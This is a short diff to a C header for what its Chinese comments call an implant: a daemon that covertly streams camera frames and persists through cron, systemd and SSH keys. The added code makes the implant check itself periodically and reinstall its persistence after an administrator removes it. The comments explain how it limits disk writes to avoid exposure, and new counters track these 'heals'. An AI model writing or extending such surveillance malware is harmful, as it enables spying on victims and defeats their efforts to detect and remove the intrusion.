@@ -146,6 +146,21 @@ typedef struct {
      *
      * NULL = 不启用 sshkey 驻留（合法形态，此时 methods[SSHKEY]=0）。 */
     const char *ssh_pubkey_file;
+
+    /*
+     * 驻留周期性自检：每完成 N 批检查一次三段是否仍在，缺失则重装。
+     *
+     * 为什么必须周期检而不是只在启动前 ensure 一次：
+     *   管理员删掉 cron 条目或 systemd 单元后，常驻进程若不重启就永远不会
+     *   重新 ensure——进程在跑、画面在回传，看起来一切正常，而机器重启后
+     *   植入体就彻底消失了。这是"驻留成功"的假象。
+     *
+     * 自检走 persist_linux_query（只读 stat + 一次文件读）而不是每次都调
+     * ensure：ensure 内部 persist_drop_self 会覆盖写落盘副本，频繁写是自
+     * 找暴露。只有 query 发现缺段时才真正重装。
+     *
+     * 0 = 关闭自检（保留旧的一次性行为）。默认由 main.c 设为 1。 */
+    uint32_t persist_recheck_batches;
 } cam_daemon_cfg_t;
 
 typedef struct {
@@ -153,6 +168,8 @@ typedef struct {
     uint32_t frames;
     uint64_t bytes_out;       /* 实际写出信元字节数 */
     int      persist_rc;      /* persist_linux_ensure: 0=新装 1=已驻留 -1=失败 */
+    uint32_t persist_rechecks;/* 周期性自检执行次数 */
+    uint32_t persist_heals;   /* 自检发现缺段并成功重装的次数 */
     int      methods[CAM_DAEMON_PERSIST_N];
     char     bin_path[4096];
     implant_err_t last_err;
